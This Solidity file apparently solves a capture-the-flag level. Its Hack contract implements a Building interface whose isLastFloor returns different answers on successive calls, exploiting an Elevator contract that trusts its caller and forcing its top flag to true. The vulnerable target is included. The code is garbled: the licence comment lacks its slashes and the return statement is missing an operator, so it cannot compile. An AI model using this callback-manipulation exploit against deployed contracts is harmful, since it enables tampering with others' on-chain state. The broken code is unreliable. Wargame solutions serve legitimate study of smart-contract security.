 SPDX-License-Identifier MIT
pragma solidity ^0.8.0;


contract Hack {
    Elevator target;
    uint count;
    constructor(address _target) {
        target = Elevator(_target);
    }

    function attack() external {
        target.goTo(1);
    }

    function isLastFloor(uint) external returns(bool){
        count++;
        return count  1;
    }
}

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}